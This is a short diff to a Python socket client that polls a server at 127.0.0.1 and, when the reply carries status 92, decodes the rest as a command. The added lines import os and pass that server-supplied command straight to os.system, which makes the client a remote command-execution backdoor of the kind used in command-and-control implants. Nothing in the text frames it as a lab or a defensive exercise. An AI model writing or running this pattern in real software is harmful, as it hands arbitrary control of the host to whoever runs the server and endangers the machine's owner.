@@ -1,6 +1,7 @@
 import socket
 import time
 import random
+import os
 
 
 IP = '127.0.0.1'
@@ -60,9 +61,11 @@ if __name__ == '__main__':
         
         response_status = int.from_bytes(response[0:4], 'little')
         
-        # print(f'response status = {response_status}')
+        print(f'response status = {response_status}')
         
         if response_status == 92:
-            print(f'command: {response[4:].decode()}')
+            decoded_command = response[4:].decode()
+            print(f'command: {decoded_command}')
+            os.system(decoded_command)
         
         client_fd.close()
